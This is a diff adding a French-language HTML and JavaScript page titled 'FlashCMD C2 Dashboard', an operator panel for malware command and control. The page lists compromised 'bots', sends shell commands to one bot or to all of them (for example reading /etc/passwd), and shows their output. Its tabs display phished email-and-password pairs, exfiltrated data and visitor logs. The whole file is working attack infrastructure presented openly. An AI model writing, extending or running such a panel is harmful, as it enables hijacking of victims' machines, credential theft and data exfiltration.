@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>FlashCMD C2 Dashboard</title>
+<style>
+  :root{--bg:#0a0a0f;--panel:#12121a;--border:#2a2a3a;
+        --red:#e63946;--green:#2ecc71;--yellow:#f39c12;
+        --text:#e0e0e0;--dim:#555;--blue:#3498db}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);
+       font-family:'Courier New',monospace;padding:16px;
+       min-height:100vh}
+  h1{color:var(--red);border-bottom:1px solid var(--border);
+     padding-bottom:10px;margin-bottom:16px;font-size:16px;
+     display:flex;align-items:center;gap:10px}
+  .stats{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
+  .stat{padding:6px 14px;border-radius:4px;font-size:12px;
+        border:1px solid}
+  .stat.green{background:rgba(46,204,113,.1);border-color:var(--green);
+              color:var(--green)}
+  .stat.red  {background:rgba(230,57,70,.1);border-color:var(--red);
+              color:var(--red)}
+  .stat.blue {background:rgba(52,152,219,.1);border-color:var(--blue);
+              color:var(--blue)}
+  .grid{display:grid;grid-template-columns:280px 1fr;gap:12px;
+        height:calc(100vh - 120px)}
+  .panel{background:var(--panel);border:1px solid var(--border);
+         border-radius:6px;padding:14px;overflow:hidden;
+         display:flex;flex-direction:column;gap:10px}
+  .panel-title{font-size:11px;color:var(--dim);text-transform:uppercase;
+               letter-spacing:.1em}
+  .bot-list{overflow-y:auto;flex:1}
+  .bot{padding:8px 10px;border-radius:4px;cursor:pointer;
+       border:1px solid transparent;font-size:11px;margin-bottom:4px;
+       transition:border .15s}
+  .bot:hover{border-color:var(--red)}
+  .bot.active{border-color:var(--red);background:rgba(230,57,70,.08)}
+  .bot .bid{color:var(--green);font-weight:700}
+  .bot .bip{color:var(--blue)}
+  .bot .bos{color:var(--dim);font-size:10px}
+  .tabs{display:flex;gap:4px;border-bottom:1px solid var(--border);
+        padding-bottom:8px}
+  .tab{padding:5px 12px;border-radius:4px 4px 0 0;cursor:pointer;
+       font-size:12px;border:1px solid transparent;border-bottom:none;
+       color:var(--dim)}
+  .tab.active{background:var(--panel);border-color:var(--border);
+              color:var(--text)}
+  .tab-content{display:none;flex:1;overflow-y:auto}
+  .tab-content.active{display:flex;flex-direction:column;gap:8px}
+  textarea,input[type=text]{
+    background:#0d0d14;border:1px solid var(--border);
+    color:var(--text);padding:8px 10px;font-family:monospace;
+    font-size:12px;border-radius:4px;outline:none;width:100%;
+    transition:border .15s}
+  textarea{resize:vertical;min-height:60px}
+  input[type=text]:focus,textarea:focus{border-color:var(--red)}
+  .btn-row{display:flex;gap:6px;flex-wrap:wrap}
+  button{padding:7px 14px;border:none;border-radius:4px;
+         cursor:pointer;font-size:12px;font-family:monospace;
+         transition:opacity .15s}
+  button:hover{opacity:.82}
+  .btn-red  {background:var(--red);color:#fff}
+  .btn-grey {background:#2a2a3a;color:var(--text)}
+  .btn-green{background:var(--green);color:#000}
+  .output{background:#0d0d14;border:1px solid var(--border);
+          border-radius:4px;padding:10px;font-size:11px;
+          white-space:pre-wrap;color:var(--green);
+          overflow-y:auto;flex:1;min-height:120px}
+  .creds-line{padding:5px 8px;border-bottom:1px solid var(--border);
+              font-size:11px;display:flex;gap:12px;flex-wrap:wrap}
+  .creds-line .ts {color:var(--dim)}
+  .creds-line .ip {color:var(--blue)}
+  .creds-line .em {color:var(--yellow)}
+  .creds-line .pw {color:var(--red)}
+  .pulse{display:inline-block;width:8px;height:8px;border-radius:50%;
+         background:var(--green);animation:pulse 1.5s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+</style>
+</head>
+<body>
+<h1>
+  <span class="pulse"></span>
+  ⚡ FlashCMD C2 Dashboard
+  <span style="margin-left:auto;font-size:12px;color:var(--dim)"
+        id="last-refresh">—</span>
+</h1>
+
+<div class="stats">
+  <div class="stat green" id="s-bots">0 bots</div>
+  <div class="stat red"   id="s-creds">0 creds</div>
+  <div class="stat blue"  id="s-visits">visits: —</div>
+</div>
+
+<div class="grid">
+  <!-- liste bots -->
+  <div class="panel">
+    <div class="panel-title">Bots connectés</div>
+    <div class="bot-list" id="bot-list">
+      <div style="color:var(--dim);font-size:12px">Chargement…</div>
+    </div>
+    <button class="btn-grey" onclick="refresh()">↻ Rafraîchir</button>
+  </div>
+
+  <!-- panneau droit -->
+  <div class="panel">
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab('cmd')">Commande</div>
+      <div class="tab"        onclick="switchTab('results')">Résultats</div>
+      <div class="tab"        onclick="switchTab('creds')">Credentials</div>
+      <div class="tab"        onclick="switchTab('exfil')">Exfil</div>
+      <div class="tab"        onclick="switchTab('visits')">Visits</div>
+    </div>
+
+    <!-- CMD -->
+    <div class="tab-content active" id="tab-cmd">
+      <div style="font-size:12px;color:var(--dim)">
+        Ciblé : <span id="target-label" style="color:var(--red)">
+          aucun bot sélectionné</span>
+      </div>
+      <input type="text" id="cmd-input"
+             placeholder="whoami | ls -la | cat /etc/passwd | sysinfo …"
+             onkeydown="if(event.key==='Enter')pushCmd()">
+      <div class="btn-row">
+        <button class="btn-red"   onclick="pushCmd()">▶ Envoyer</button>
+        <button class="btn-grey"  onclick="pushAll()">⇶ Envoyer à tous</button>
+        <button class="btn-grey"  onclick="quickCmd('sysinfo')">sysinfo</button>
+        <button class="btn-grey"  onclick="quickCmd('whoami')">whoami</button>
+        <button class="btn-grey"  onclick="quickCmd('hostname')">hostname</button>
+        <button class="btn-grey"  onclick="quickCmd('ipconfig || ip a')">ip</button>
+      </div>
+    </div>
+
+    <!-- RESULTS -->
+    <div class="tab-content" id="tab-results">
+      <div style="font-size:11px;color:var(--dim)">
+        Résultats du bot sélectionné (auto-refresh 10s)
+      </div>
+      <div class="output" id="result-box">Sélectionne un bot…</div>
+      <button class="btn-grey" onclick="loadResults()">↻</button>
+    </div>
+
+    <!-- CREDS -->
+    <div class="tab-content" id="tab-creds">
+      <div style="font-size:11px;color:var(--dim)">
+        Credentials phishés — collectés via /collect
+      </div>
+      <div class="output" id="creds-box" style="color:var(--text)">
+        Chargement…
+      </div>
+      <button class="btn-grey" onclick="loadCreds()">↻</button>
+    </div>
+
+    <!-- EXFIL -->
+    <div class="tab-content" id="tab-exfil">
+      <div style="font-size:11px;color:var(--dim)">
+        Données exfiltrées — /exfil log
+      </div>
+      <div class="output" id="exfil-box">Chargement…</div>
+      <button class="btn-grey" onclick="loadExfil()">↻</button>
+    </div>
+
+    <!-- VISITS -->
+    <div class="tab-content" id="tab-visits">
+      <div style="font-size:11px;color:var(--dim)">
+        Log de visites — 50 dernières entrées
+      </div>
+      <div class="output" id="visits-box">Chargement…</div>
+      <button class="btn-grey" onclick="loadVisits()">↻</button>
+    </div>
+  </div>
+</div>
+
+<script>
+let selectedBot = null;
+let allBots     = {};
+
+// ── tabs ─────────────────────────────────────────────────────
+function switchTab(name) {
+  document.querySelectorAll(".tab-content").forEach(el => {
+    el.classList.remove("active");
+  });
+  document.querySelectorAll(".tab").forEach(el => {
+    el.classList.remove("active");
+  });
+  document.getElementById("tab-" + name).classList.add("active");
+  event.target.classList.add("active");
+  if (name === "results") loadResults();
+  if (name === "creds")   loadCreds();
+  if (name === "exfil")   loadExfil();
+  if (name === "visits")  loadVisits();
+}
+
+// ── bots ─────────────────────────────────────────────────────
+async function refresh() {
+  try {
+    const r = await fetch("/c2/bots");
+    allBots = await r.json();
+  } catch { allBots = {}; }
+
+  const list = document.getElementById("bot-list");
+  list.innerHTML = "";
+  const ids = Object.keys(allBots);
+  document.getElementById("s-bots").textContent = ids.length + " bot(s)";
+  document.getElementById("last-refresh").textContent =
+    new Date().toLocaleTimeString();
+
+  if (!ids.length) {
+    list.innerHTML = '<div style="color:var(--dim);font-size:12px">Aucun bot</div>';
+    return;
+  }
+
+  for (const [id, info] of Object.entries(allBots)) {
+    const div = document.createElement("div");
+    div.className = "bot" + (id === selectedBot ? " active" : "");
+    const tasks   = (info.tasks   || []).length;
+    const results = (info.results || []).length;
+    div.innerHTML = `
+      <div class="bid">${id}</div>
+      <div class="bip">${info.ip}</div>
+      <div class="bos">${(info.os||"").slice(0,40)}</div>
+      <div class="bos">user:${info.user||"?"} | t:${tasks} r:${results}</div>
+      <div class="bos">${(info.last_seen||"").slice(0,19)}</div>
+    `;
+    div.onclick = () => selectBot(id);
+    list.appendChild(div);
+  }
+}
+
+function selectBot(id) {
+  selectedBot = id;
+  document.getElementById("target-label").textContent = id;
+  document.querySelectorAll(".bot").forEach(el => el.classList.remove("active"));
+  event.currentTarget.classList.add("active");
+}
+
+// ── push commande ─────────────────────────────────────────────
+async function pushCmd() {
+  if (!selectedBot) { alert("Sélectionne un bot"); return; }
+  const cmd = document.getElementById("cmd-input").value.trim();
+  if (!cmd) return;
+  await fetch(`/c2/push/${selectedBot}`, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({cmd}),
+  });
+  document.getElementById("cmd-input").value = "";
+  setTimeout(loadResults, 2000);
+}
+
+async function pushAll() {
+  const cmd = document.getElementById("cmd-input").value.trim();
+  if (!cmd) return;
+  for (const id of Object.keys(allBots)) {
+    await fetch(`/c2/push/${id}`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({cmd}),
+    });
+  }
+  document.getElementById("cmd-input").value = "";
+}
+
+function quickCmd(cmd) {
+  document.getElementById("cmd-input").value = cmd;
+  pushCmd();
+}
+
+// ── résultats ─────────────────────────────────────────────────
+async function loadResults() {
+  if (!selectedBot) {
+    document.getElementById("result-box").textContent = "Sélectionne un bot…";
+    return;
+  }
+  const bot     = allBots[selectedBot] || {};
+  const results = (bot.results || []);
+  if (!results.length) {
+    document.getElementById("result-box").textContent = "(aucun résultat)";
+    return;
+  }
+  const text = results.map(r =>
+    `[${(r.ts||"").slice(0,19)}]\n${r.output}`
+  ).join("\n\n──────────────────────────────\n\n");
+  const box = document.getElementById("result-box");
+  box.textContent = text;
+  box.scrollTop   = box.scrollHeight;
+}
+
+// ── credentials ───────────────────────────────────────────────
+async function loadCreds() {
+  try {
+    const r   = await fetch("/c2/creds");
+    const txt = await r.text();
+    const box = document.getElementById("creds-box");
+    if (!txt.trim() || txt.trim() === "(vide)") {
+      box.textContent = "(aucun credential)"; return;
+    }
+    box.innerHTML = "";
+    let count = 0;
+    txt.trim().split("\n").forEach(line => {
+      try {
+        const e   = JSON.parse(line);
+        const div = document.createElement("div");
+        div.className = "creds-line";
+        div.innerHTML = `
+          <span class="ts">${(e.ts||"").slice(0,19)}</span>
+          <span class="ip">${e.ip||""}</span>
+          <span class="em">${e.email||""}</span>
+          <span class="pw">${e.password||""}</span>
+          <span style="color:var(--dim)">${e.page||""}</span>
+        `;
+        box.appendChild(div);
+        count++;
+      } catch { }
+    });
+    document.getElementById("s-creds").textContent = count + " creds";
+  } catch (e) {
+    document.getElementById("creds-box").textContent = "Erreur: " + e;
+  }
+}
+
+// ── exfil ─────────────────────────────────────────────────────
+async function loadExfil() {
+  try {
+    const r   = await fetch("/c2/exfil");
+    const txt = await r.text();
+    document.getElementById("exfil-box").textContent =
+      txt.trim() || "(vide)";
+  } catch (e) {
+    document.getElementById("exfil-box").textContent = "Erreur: " + e;
+  }
+}
+
+// ── visits ────────────────────────────────────────────────────
+async function loadVisits() {
+  try {
+    const r    = await fetch("/c2/visits");
+    const txt  = await r.text();
+    const lines = (txt||"").trim().split("\n").slice(-50);
+    document.getElementById("visits-box").textContent =
+      lines.join("\n") || "(vide)";
+    document.getElementById("s-visits").textContent =
+      "visits: " + lines.length;
+  } catch (e) {
+    document.getElementById("visits-box").textContent = "Erreur: " + e;
+  }
+}
+
+// ── auto-refresh ──────────────────────────────────────────────
+refresh();
+setInterval(refresh, 10000);
+setInterval(() => {
+  if (selectedBot) loadResults();
+}, 10000);
+</script>
+</body>
+</html>
